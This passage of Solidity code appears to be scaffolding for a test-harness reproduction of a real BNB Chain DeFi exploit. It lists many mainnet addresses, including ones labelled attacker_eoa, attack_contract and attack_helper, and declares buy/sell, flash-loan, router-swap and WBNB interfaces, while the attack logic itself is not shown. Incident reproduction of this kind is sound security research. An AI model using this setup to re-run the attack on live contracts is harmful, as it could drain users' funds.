    address internal constant A_02B0F1_3F5E = 0x02B0f11C58f688eADcd078b45e697F5E0C7D3f5e;
    address internal constant A_03B9A5_5C2A = 0x03b9A589f46C1553a7E943c9312Da48AF8385C2a;
    address internal constant A_051B8B_48F4 = 0x051b8bf1E14400996E0C468305958043560548F4;
    address internal constant A_08C191_6F73 = 0x08c191c85714a169d6562C5695C09834FC9d6F73;
    address internal constant Cake_LP = 0x08E18735e5A2bF96715F9c9647b451CF213BeC25;
    address internal constant attack_helper = 0x0a6139bB1454C223eFC8524D626936D5FAfB9D05;
    address internal constant A_0A9EF5_B613 = 0x0A9eF58186EB9D3Afcd349291B950114e725b613;
    address internal constant A_0B65A4_6656 = 0x0B65a4F7E008a1833fb1cc3816204c682C316656;
    address internal constant A_0E074D_61AA = 0x0E074d49B4DC31D304Ed22c3F154DB61462161AA;
    address internal constant A_0F118E_B49C = 0x0F118E4C6DD6E127Af2aD99623da8Aa88CA8B49C;
    address internal constant A_100883_6699 = 0x100883c4442cbC6178A2E80B2fb6B3640d906699;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant A_1A4305_FC25 = 0x1a43058E9e03DCc77920106cC11d0DaCa3D8fC25;
    address internal constant A_1ABEBA_C81E = 0x1AbEBa03cC480732Ab146D8aCb6b269C8F21c81e;
    address internal constant attack_helper_D6B8 = 0x1bea54B0c39140D5Ae4414150B2FFF0bd64fD6b8;
    address internal constant A_2018B0_3DBD = 0x2018B06Ce10C4f3F596C252F77207ECcb1e33dbD;
    address internal constant A_20EA9F_B27E = 0x20eA9F7d293AF4ED4e9F43eA63FE36717dcDB27E;
    address internal constant A_219F8D_36C6 = 0x219f8d710E9E6a4C5b88F898d45f1558CC2636C6;
    address internal constant A_222200_0000 = 0x2222000000000000000000000000000000000000;
    address internal constant A_22787E_4BCD = 0x22787E338C4B816c0B40a89D646Fd38822BB4BCD;
    address internal constant A_23359D_E426 = 0x23359db1eC9f024b32a7C87A8E58cAeB6c0BE426;
    address internal constant A_23EAF9_98D3 = 0x23EAF977Ac3D4c18D3842255b67365B8197D98D3;
    address internal constant A_252C9F_199F = 0x252C9FFF0d3929fD1E0a47B110D72a3C4534199F;
    address internal constant A_252CDA_595B = 0x252cda981721EA3E57ef047898Eb95292aaE595b;
    address internal constant A_25671E_7C82 = 0x25671e71D4DE6Fb3093f362dD5e7d20037627C82;
    address internal constant A_2C9318_547B = 0x2C93186B326379Bc21b3a876a8AC9E39A40c547B;
    address internal constant A_2CB5BB_09FF = 0x2cb5Bb49c3F75F5eB576Ce799915A1bAFc2C09fF;
    address internal constant A_2D8D5D_4657 = 0x2d8d5D840632E72a34665eC86ceA4dCF0DA64657;
    address internal constant A_2E4C85_D649 = 0x2E4c8539a45818c62af03D542eAC5767684cd649;
    address internal constant A_2E7A12_AE57 = 0x2e7a12B42370451373785aA3Fb995eC9F2b4Ae57;
    address internal constant attack_helper_816B = 0x2EBe791c1507b1626054A8DC3857ea5Bd721816B;
    address internal constant A_305415_E1BE = 0x305415a1e96534D35d8758BD2dD63021b01Ee1bE;
    address internal constant A_339D8D_1796 = 0x339D8DC71b4dc1ABc51790fa7be453f82C751796;
    address internal constant A_3533EB_4D20 = 0x3533Eb6BBb26f2111afaa4EF2795061F310c4D20;
    address internal constant A_35E6A9_4185 = 0x35E6A9D67A2261adCCFbeC3A02a555f2D3fc4185;
    address internal constant A_3720CB_B6E0 = 0x3720cb130e472816291515ecAd696EA509DDb6E0;
    address internal constant A_3CC3D4_BEBF = 0x3CC3D4445b23bBA1F69934D587300154bcf5BEBf;
    address internal constant A_3D2785_AE81 = 0x3d2785651EAB19C11334374Ad008a533d912AE81;
    address internal constant A_3D5D1E_DD0B = 0x3d5d1e06e9e67908f940059D13fC0a655F81dD0B;
    address internal constant attack_contract = 0x3F32c7cfb0a78DDEA80a2384CEB4633099CbDC98;
    address internal constant A_3F5525_0955 = 0x3F5525921c2d4F5D9323b1DDA9f8115995e40955;
    address internal constant A_4023A1_525D = 0x4023a1b89ac59a6e70E2E8a6f4bb5438e119525d;
    address internal constant A_41129F_0BCC = 0x41129f982bB5dB859a2dC8B1c663F4D69c190BCc;
    address internal constant A_42193B_6A2A = 0x42193B0850747661E94A7347ad461a02D1e06a2A;
    address internal constant A_428A86_9111 = 0x428a86AACcf7aBd475c921d7E4dFf7e450A89111;
    address internal constant A_45579D_0214 = 0x45579Dab22BF30C80Bb250c0b5Cde7e003810214;
    address internal constant attack_helper_422F = 0x460096057037C7fd5072A728dF4392eF70Da422f;
    address internal constant A_464704_2F84 = 0x464704D7C414CbdB2f53076d86b9dd36bFb22f84;
    address internal constant A_495943_FE82 = 0x495943e54f26918616D1E930d60F1617e03aFE82;
    address internal constant A_4ADD20_19E4 = 0x4ADD20a665c0186D4684c67D575D23fE967719E4;
    address internal constant A_4E8015_F0F6 = 0x4e8015f9d8376A1247B1cbA236c0B716033fF0F6;
    address internal constant A_4F1014_1767 = 0x4f101492c9AD630F2413dA26aD9130bE39521767;
    address internal constant A_513BE5_B315 = 0x513BE589279ba0022d1941D10bDD651d9fb8b315;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_56203C_9E0F = 0x56203C1524d9B36cEfdf1Ae082606E5693b39E0F;
    address internal constant A_5785B5_78A2 = 0x5785B5aC758bfc47997A1426142dC68a25AD78A2;
    address internal constant A_5837CA_3C5E = 0x5837CaE19285c7Ed65a099ab29624cf623803c5e;
    address internal constant A_5AE6E9_8C28 = 0x5AE6E9068a81c43118802056CfEb3db4F9488c28;
    address internal constant A_5D6400_3E0C = 0x5d6400Ec214aFB774DcF402388dbC02634bC3E0C;
    address internal constant A_5D966D_57E1 = 0x5D966dE25202aeC5A8430ef13eE82aB8DDd357e1;
    address internal constant A_60CF4F_388A = 0x60Cf4F22E9b09E0924B647b50d5f45D49E02388a;
    address internal constant A_617E88_F6FD = 0x617E88d9a74cfD75C2fC51B972d60e8cF0e4F6fD;
    address internal constant A_618A65_375A = 0x618a659dbcf4f193cE3c6Fa2025873D75737375A;
    address internal constant attack_helper_4975 = 0x6272aB4E4c7022b1532B612ee9f349E718364975;
    address internal constant A_63F5D8_8327 = 0x63F5d8791F9457Dfb79CD3579daDf377791A8327;
    address internal constant A_65B8FB_0F57 = 0x65B8fB65B9Ad87470F8dc8CC724F4F7d3b750F57;
    address internal constant A_689FBC_6D39 = 0x689FbC2e85380671b78Ac5E38a9A292753d76D39;
    address internal constant A_68FBD9_A87B = 0x68Fbd9940436f28F2BD1e0A55e56367C71ccA87b;
    address internal constant P719 = 0x6bEee2B57b064EAC5F432FC19009E3E78734Eabc;
    address internal constant A_6D0BC6_E4B9 = 0x6d0bc6d3f61129567D9f79a7dd31d1a6dc29e4B9;
    address internal constant A_6DA970_E923 = 0x6dA9700B31F48d3A9FA353BBcb4a73213422e923;
    address internal constant A_6EC802_1745 = 0x6EC8028E9c29EF96Dc44354c0D0FEEe58AbC1745;
    address internal constant A_716BFB_3056 = 0x716bfbDA8eeaa5F035a0566F793926cB06A23056;
    address internal constant A_71955E_6A2F = 0x71955eF38a75fDeCa762C40B04bf989c923E6A2f;
    address internal constant A_71B554_FEDA = 0x71B55472Bc1c3Fe0E41CF41701f3cFCc8914FedA;
    address internal constant A_751983_2CA1 = 0x7519836890F545c548dF5E6b9D937F0D9B122CA1;
    address internal constant A_7531E1_AD55 = 0x7531e149B3335098100D378C06E3E090E1DeaD55;
    address internal constant attack_helper_EDD5 = 0x75c0850e851bD8617011f67B634b46251a3FeDd5;
    address internal constant A_7934B8_F8A5 = 0x7934B867BEa2d60ef0a11D629d5BE17C0Ce0F8A5;
    address internal constant A_79E7ED_9422 = 0x79e7Ed1a67d636cdDEA6D78510199e5394c29422;
    address internal constant A_7A87D3_6100 = 0x7A87D3Af5D206335a0e6A3DE9b5aBfCe54516100;
    address internal constant A_7FA49A_D980 = 0x7fa49a24Bc20fbf392EDC2FDAb077F8cD93bd980;
    address internal constant attack_helper_D6F6 = 0x8110b180f8Ca42491a0B51CDbCf06aAfFa10d6f6;
    address internal constant A_812B46_A1CC = 0x812B465dD476Ab1A2B90231957406ADD78c3A1CC;
    address internal constant A_859551_E349 = 0x8595517025D0C8f9C175C6565b8A8a7f2EDAE349;
    address internal constant A_85AB58_F245 = 0x85aB58b68E9068623E7854fa451bB2aFC3dEF245;
    address internal constant A_886BF9_72E3 = 0x886bF9A7C3Ca1E132a2286808723b4B97eD672E3;
    address internal constant A_88E75D_D569 = 0x88e75da4dDDbA5A440aD1caD99a6289Ab892D569;
    address internal constant A_8A6873_D9CA = 0x8a68731fA08a06c81a8964e75733a0273cB8d9Ca;
    address internal constant A_8B538C_FB14 = 0x8b538CcfA188Cb935d163271ac5c3E1bAEfBFb14;
    address internal constant A_8E2A27_E688 = 0x8e2A2744D4DAbb49Bcbe51bFEF1D8109ad6cE688;
    address internal constant A_9102A6_6CBF = 0x9102a67e40385df4e62e3f1B6A7F9BB24d1b6CBf;
    address internal constant A_94C04E_3A92 = 0x94C04EfBF00298AefC00CA7e8224079095c13A92;
    address internal constant A_97F8FB_ADB3 = 0x97F8Fb8067BCF775DC702AE52E9d8c913970AdB3;
    address internal constant A_98C2F7_6A4C = 0x98C2f7955f1d9408e93FFaa26a84cF4B78Fe6a4C;
    address internal constant attack_helper_B4F0 = 0x9927Aed3442B43A9175F51d5123f40ABF89db4F0;
    address internal constant attack_helper_3BA2 = 0x995Af97E1d41E8edC467bB86CC8cA5BcCe453Ba2;
    address internal constant A_99839D_D644 = 0x99839d8aC743A724DAa803192FE06f067e22D644;
    address internal constant A_99CD55_6E62 = 0x99CD55d6A838F465CaEba3B64e267ADF29516e62;
    address internal constant A_99F8C4_7E9C = 0x99f8c456f5a7145a418959A38718006033C07e9C;
    address internal constant A_9DCC3E_7B64 = 0x9DCC3E63B29015ecCa8e31fF399c0D54518C7B64;
    address internal constant A_A01BDF_9BD2 = 0xa01bdFe4198157c3f143fcF3A66Ec72a69B09Bd2;
    address internal constant attack_helper_A0DF = 0xA0F5E0d1ed5f0E36c122328e6CA455f015d9a0Df;
    address internal constant A_A11189_6963 = 0xA11189DF6C4E265E6aa83F42CF25624e44A66963;
    address internal constant A_A39962_60BE = 0xA399623851EB1828D43d69590C3d7FB03DeC60BE;
    address internal constant A_A4E48A_5911 = 0xA4e48A7245DF01DcDf4Aa0025445394d10A25911;
    address internal constant A_A53CE2_FEC9 = 0xA53ce288E5aa0561C03Be206aF3aBB629519FEC9;
    address internal constant A_A922C4_4944 = 0xa922c479B55054f7c65Cbc73198dcC3Be23D4944;
    address internal constant A_AC2757_232B = 0xac27575Baae24E2D78aE713050B9d0ac79f2232b;
    address internal constant A_ADBE38_98FA = 0xAdBE38C920A08A9e21533EF33843B80169D198fA;
    address internal constant A_B09316_0FBD = 0xB093163a93A5687f93859dDCa16ffADe4Ce60fBd;
    address internal constant attack_helper_C858 = 0xb91f4657fcDfd121171bb54B0FdC7669ad74c858;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_BA4925_F4D8 = 0xba49250462Fd041f0531cD13aC1E9BB3F445F4D8;
    address internal constant A_BA6D08_61FB = 0xBA6D08D87f195a19f3cA64c4Da6eb3Cb4Ff761fb;
    address internal constant A_BA949A_F706 = 0xBA949a882d37c8A9df53B1E8B10022B85249F706;
    address internal constant A_BAE398_68E1 = 0xbAE398D8892BbF2b467D90c764a4A7e01e5268E1;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_helper_FC29 = 0xC11Dbcf77C25309abEFCCF8B8282daF08EAcfC29;
    address internal constant A_C34699_F7B5 = 0xC34699773A5a094CC8fE6bbA6DCC39D0D889F7B5;
    address internal constant A_C44640_D087 = 0xc446402a7519b768c812Ad74194686Ca955fD087;
    address internal constant A_C63E07_53F1 = 0xC63E070D28Ed9cc5455753f9D3532D83BA1a53F1;
    address internal constant A_C6AC1E_A6CE = 0xC6ac1eeA011987268bAbaAa3aE33244104e3a6CE;
    address internal constant A_C71170_46B5 = 0xC711700568B39aeaE624651D0f6d2E62C98D46b5;
    address internal constant A_C79C4C_462E = 0xc79c4cEFE702B2fcc7b4378CEe26451867D8462E;
    address internal constant A_C848EF_2597 = 0xC848EFbda9FeBeC5D08553F6aAB3D44316402597;
    address internal constant A_C8DCE6_C5DD = 0xC8DcE69A8d31d3B3f0e878d065bBbacb540bC5Dd;
    address internal constant A_C8FBDA_3987 = 0xc8FBDa04A8f9f1881d1301fbBAF793d402Ba3987;
    address internal constant sdgh = 0xCe7de92ab33Fa219EF3B336925Fbd33Dd6E4A0F6;
    address internal constant A_CE9D1B_A43D = 0xce9D1b24D7447B768Ee19030ae123a4b00cCA43D;
    address internal constant A_CF14D1_14D3 = 0xcf14d1cD81D64917fF801F0Dee9ee009Eeca14D3;
    address internal constant A_D13C8F_869E = 0xD13C8F50A94B444b9C9559F7FDF288EA4Fe6869E;
    address internal constant A_D229E5_38B4 = 0xd229E5c97bfDb2CC803C50121dB7130930dA38b4;
    address internal constant A_D3868B_3EEE = 0xd3868B228e19b6d759B0d008C647e73f20083Eee;
    address internal constant A_D3C386_F1D1 = 0xD3c386Afa4fEE77D22130aC86D88067eb3c3f1d1;
    address internal constant A_D4E54B_2AA8 = 0xD4e54B70AA08242dD6a8A1b2295FeC7F3ed22aa8;
    address internal constant A_D75D6C_0582 = 0xd75d6c84B16Bc7956E27A3fe82d00b8DdCDf0582;
    address internal constant A_D7E519_A75A = 0xd7e51962Ad22616F2e8F3b5d2c6e7047F130a75a;
    address internal constant A_D809BE_8F35 = 0xD809be84D63b767151bf765124D47281c7cB8f35;
    address internal constant A_D932DA_0969 = 0xD932DA69ED7f912838206766D497e089d68b0969;
    address internal constant A_DACB83_2481 = 0xDACb8375A473d3e97AA3E96553436fCFed872481;
    address internal constant A_DBA3B6_9131 = 0xDBa3B6E204293BE7accE24483B1aaFB50F8D9131;
    address internal constant A_DD69A8_2D5A = 0xdD69A806FB20f1F22f696A8DE84E41bdbced2d5a;
    address internal constant attack_helper_2950 = 0xde499a0825408D2562567fF9Ef47bF90c7d12950;
    address internal constant A_DE6F01_590C = 0xdE6f01456384f0ceb392FE642Cad3DD599e7590c;
    address internal constant A_E0186C_CD40 = 0xe0186CECE85B0bCE405C35FD4254286A7Bc5CD40;
    address internal constant A_E4241B_33E5 = 0xe4241BD112F15D21DD3C42DC48ebbF1A075233e5;
    address internal constant A_E50253_09CD = 0xE50253B73Ac8d8f24953349b7A36992555D009CD;
    address internal constant A_E56A16_E9B3 = 0xE56A16030116713116D3321D5C339C318521E9b3;
    address internal constant A_E95739_DF34 = 0xE95739c8c20a3C281F8781De0bf4e2725896DF34;
    address internal constant A_EA7B51_C3CA = 0xea7B511B9cdfE50a8D9Fdf51cF291f132089C3ca;
    address internal constant A_EC7C8E_26B0 = 0xec7c8E5760562Be49e87b6536CEC44Bc73ec26b0;
    address internal constant A_ECB800_13A2 = 0xeCb8000d20aFd50236f37AC2E32286df967C13A2;
    address internal constant attack_helper_970F = 0xed4f43968c140F6F63135a85b9c57c79654B970f;
    address internal constant A_F07AF9_BA20 = 0xf07af9555685beA0122d957Bb7845aAFC980BA20;
    address internal constant A_F0A921_F6CB = 0xf0A92194caD9493488C4400ac857021A6FebF6cB;
    address internal constant A_F6D10D_3B04 = 0xf6D10Dddd0A10B16E814501f56c222518c293B04;
    address internal constant A_F89CCB_B883 = 0xf89Ccbf6EBD45636c7F6021aAd3E25E71E95B883;
    address internal constant A_FA4929_74AB = 0xFa4929083eF4b7f1D622350224F46fE98F6974AB;
    address internal constant attacker_eoa = 0xFeb19AE8C0448f25de43a3AFCB7B29c9CEf6Eff6;
    address internal constant attack_helper_F720 = 0xfEeb1806f7CD9d527A8c3D5F90E93EE2438cF720;
}

interface IContract_02B0F1_3F5E {
    function sell(uint256) external;
}

interface IContract_03B9A5_5C2A {
    function sell(uint256) external;
}

interface IContract_051B8B_48F4 {
    function sell(uint256) external;
}

interface IContract_08C191_6F73 {
    function sell(uint256) external;
}

interface IContract_0A9EF5_B613 {
    function sell(uint256) external;
}

interface IContract_0B65A4_6656 {
    function sell(uint256) external;
}

interface IContract_0F118E_B49C {
    function sell(uint256) external;
}

interface IContract_100883_6699 {
    function buy() external payable;
}

interface IContract_1A4305_FC25 {
    function buy() external payable;
}

interface IContract_1ABEBA_C81E {
    function sell(uint256) external;
}

interface IContract_2018B0_3DBD {
    function sell(uint256) external;
}

interface IContract_20EA9F_B27E {
    function buy() external payable;
}

interface IContract_219F8D_36C6 {
    function sell(uint256) external;
}

interface IContract_22787E_4BCD {
    function sell(uint256) external;
}

interface IContract_23359D_E426 {
    function buy() external payable;
}

interface IContract_23EAF9_98D3 {
    function sell(uint256) external;
}

interface IContract_252C9F_199F {
    function sell(uint256) external;
}

interface IContract_252CDA_595B {
    function sell(uint256) external;
}

interface IContract_25671E_7C82 {
    function sell(uint256) external;
}

interface IContract_2C9318_547B {
    function buy() external payable;
}

interface IContract_2CB5BB_09FF {
    function sell(uint256) external;
}

interface IContract_2D8D5D_4657 {
    function sell(uint256) external;
}

interface IContract_2E4C85_D649 {
    function sell(uint256) external;
}

interface IContract_2E7A12_AE57 {
    function sell(uint256) external;
}

interface IContract_305415_E1BE {
    function sell(uint256) external;
}

interface IContract_339D8D_1796 {
    function sell(uint256) external;
}

interface IContract_3533EB_4D20 {
    function buy() external payable;
}

interface IContract_35E6A9_4185 {
    function sell(uint256) external;
}

interface IContract_3720CB_B6E0 {
    function buy() external payable;
}

interface IContract_3CC3D4_BEBF {
    function buy() external payable;
}

interface IContract_3D2785_AE81 {
    function buy() external payable;
}

interface IContract_3F5525_0955 {
    function sell(uint256) external;
}

interface IContract_4023A1_525D {
    function sell(uint256) external;
}

interface IContract_41129F_0BCC {
    function sell(uint256) external;
}

interface IContract_42193B_6A2A {
    function sell(uint256) external;
}

interface IContract_428A86_9111 {
    function sell(uint256) external;
}

interface IContract_45579D_0214 {
    function sell(uint256) external;
}

interface IContract_464704_2F84 {
    function sell(uint256) external;
}

interface IContract_495943_FE82 {
    function sell(uint256) external;
}

interface IContract_4ADD20_19E4 {
    function sell(uint256) external;
}

interface IContract_4E8015_F0F6 {
    function buy() external payable;
}

interface IContract_4F1014_1767 {
    function buy() external payable;
}

interface IContract_513BE5_B315 {
    function sell(uint256) external;
}

interface IContract_56203C_9E0F {
    function buy() external payable;
}

interface IContract_5785B5_78A2 {
    function sell(uint256) external;
}

interface IContract_5837CA_3C5E {
    function sell(uint256) external;
}

interface IContract_5AE6E9_8C28 {
    function sell(uint256) external;
}

interface IContract_5D6400_3E0C {
    function sell(uint256) external;
}

interface IContract_5D966D_57E1 {
    function sell(uint256) external;
}

interface IContract_60CF4F_388A {
    function buy() external payable;
}

interface IContract_617E88_F6FD {
    function sell(uint256) external;
}

interface IContract_618A65_375A {
    function sell(uint256) external;
}

interface IContract_63F5D8_8327 {
    function sell(uint256) external;
}

interface IContract_65B8FB_0F57 {
    function sell(uint256) external;
}

interface IContract_689FBC_6D39 {
    function sell(uint256) external;
}

interface IContract_68FBD9_A87B {
    function sell(uint256) external;
}

interface IContract_6D0BC6_E4B9 {
    function sell(uint256) external;
}

interface IContract_6DA970_E923 {
    function sell(uint256) external;
}

interface IContract_6EC802_1745 {
    function sell(uint256) external;
}

interface IContract_716BFB_3056 {
    function sell(uint256) external;
}

interface IContract_71955E_6A2F {
    function sell(uint256) external;
}

interface IContract_71B554_FEDA {
    function sell(uint256) external;
}

interface IContract_751983_2CA1 {
    function sell(uint256) external;
}

interface IContract_7531E1_AD55 {
    function sell(uint256) external;
}

interface IContract_7934B8_F8A5 {
    function buy() external payable;
}

interface IContract_79E7ED_9422 {
    function sell(uint256) external;
}

interface IContract_7A87D3_6100 {
    function sell(uint256) external;
}

interface IContract_7FA49A_D980 {
    function sell(uint256) external;
}

interface IContract_812B46_A1CC {
    function sell(uint256) external;
}

interface IContract_859551_E349 {
    function buy() external payable;
}

interface IContract_85AB58_F245 {
    function sell(uint256) external;
}

interface IContract_886BF9_72E3 {
    function sell(uint256) external;
}

interface IContract_88E75D_D569 {
    function sell(uint256) external;
}

interface IContract_8A6873_D9CA {
    function buy() external payable;
}

interface IContract_8B538C_FB14 {
    function sell(uint256) external;
}

interface IContract_8E2A27_E688 {
    function buy() external payable;
}

interface IContract_9102A6_6CBF {
    function sell(uint256) external;
}

interface IContract_94C04E_3A92 {
    function sell(uint256) external;
}

interface IContract_97F8FB_ADB3 {
    function buy() external payable;
}

interface IContract_98C2F7_6A4C {
    function buy() external payable;
}

interface IContract_99839D_D644 {
    function sell(uint256) external;
}

interface IContract_99F8C4_7E9C {
    function sell(uint256) external;
}

interface IContract_9DCC3E_7B64 {
    function sell(uint256) external;
}

interface IContract_A01BDF_9BD2 {
    function sell(uint256) external;
}

interface IContract_A11189_6963 {
    function sell(uint256) external;
}

interface IContract_A39962_60BE {
    function buy() external payable;
}

interface IContract_A4E48A_5911 {
    function sell(uint256) external;
}

interface IContract_A53CE2_FEC9 {
    function sell(uint256) external;
}

interface IContract_A922C4_4944 {
    function sell(uint256) external;
}

interface IContract_AC2757_232B {
    function buy() external payable;
}

interface IContract_ADBE38_98FA {
    function sell(uint256) external;
}

interface IContract_B09316_0FBD {
    function sell(uint256) external;
}

interface IContract_BA4925_F4D8 {
    function buy() external payable;
}

interface IContract_BA6D08_61FB {
    function sell(uint256) external;
}

interface IContract_BA949A_F706 {
    function sell(uint256) external;
}

interface IContract_BAE398_68E1 {
    function sell(uint256) external;
}

interface IContract_C34699_F7B5 {
    function sell(uint256) external;
}

interface IContract_C44640_D087 {
    function sell(uint256) external;
}

interface IContract_C63E07_53F1 {
    function sell(uint256) external;
}

interface IContract_C6AC1E_A6CE {
    function sell(uint256) external;
}

interface IContract_C71170_46B5 {
    function buy() external payable;
}

interface IContract_C79C4C_462E {
    function buy() external payable;
}

interface IContract_C848EF_2597 {
    function sell(uint256) external;
}

interface IContract_C8DCE6_C5DD {
    function buy() external payable;
}

interface IContract_C8FBDA_3987 {
    function sell(uint256) external;
}

interface IContract_CE9D1B_A43D {
    function sell(uint256) external;
}

interface IContract_CF14D1_14D3 {
    function buy() external payable;
}

interface IContract_D13C8F_869E {
    function sell(uint256) external;
}

interface IContract_D229E5_38B4 {
    function buy() external payable;
}

interface IContract_D3868B_3EEE {
    function buy() external payable;
}

interface IContract_D3C386_F1D1 {
    function buy() external payable;
}

interface IContract_D4E54B_2AA8 {
    function sell(uint256) external;
}

interface IContract_D75D6C_0582 {
    function sell(uint256) external;
}

interface IContract_D7E519_A75A {
    function sell(uint256) external;
}

interface IContract_D809BE_8F35 {
    function sell(uint256) external;
}

interface IContract_D932DA_0969 {
    function sell(uint256) external;
}

interface IContract_DACB83_2481 {
    function sell(uint256) external;
}

interface IContract_DBA3B6_9131 {
    function sell(uint256) external;
}

interface IContract_DD69A8_2D5A {
    function sell(uint256) external;
}

interface IContract_DE6F01_590C {
    function sell(uint256) external;
}

interface IContract_E0186C_CD40 {
    function sell(uint256) external;
}

interface IContract_E4241B_33E5 {
    function sell(uint256) external;
}

interface IContract_E50253_09CD {
    function buy() external payable;
}

interface IContract_E56A16_E9B3 {
    function sell(uint256) external;
}

interface IContract_E95739_DF34 {
    function sell(uint256) external;
}

interface IContract_EA7B51_C3CA {
    function sell(uint256) external;
}

interface IContract_EC7C8E_26B0 {
    function sell(uint256) external;
}

interface IContract_ECB800_13A2 {
    function buy() external payable;
}

interface IContract_F07AF9_BA20 {
    function sell(uint256) external;
}

interface IContract_F0A921_F6CB {
    function sell(uint256) external;
}

interface IContract_F6D10D_3B04 {
    function buy() external payable;
}

interface IContract_F89CCB_B883 {
    function sell(uint256) external;
}

interface IContract_FA4929_74AB {
    function buy() external payable;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface Iattack_helper {
    function buy() external payable;
}

interface Iattack_helper_2950 {
    function buy() external payable;
}

interface Iattack_helper_3BA2 {
    function buy() external payable;
}

interface Iattack_helper_4975 {
    function buy() external payable;
}

interface Iattack_helper_816B {
    function buy() external payable;
}

interface Iattack_helper_970F {
    function buy() external payable;
}

interface Iattack_helper_A0DF {
    function buy() external payable;
}

interface Iattack_helper_B4F0 {
    function buy() external payable;
}

interface Iattack_helper_C858 {
    function buy() external payable;
}

interface Iattack_helper_D6B8 {
    function buy() external payable;
}

interface Iattack_helper_D6F6 {
    function buy() external payable;
}

interface Iattack_helper_EDD5 {
    function buy() external payable;
}

interface Iattack_helper_F720 {
    function buy() external payable;
}

interface Iattack_helper_FC29 {
    function buy() external payable;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
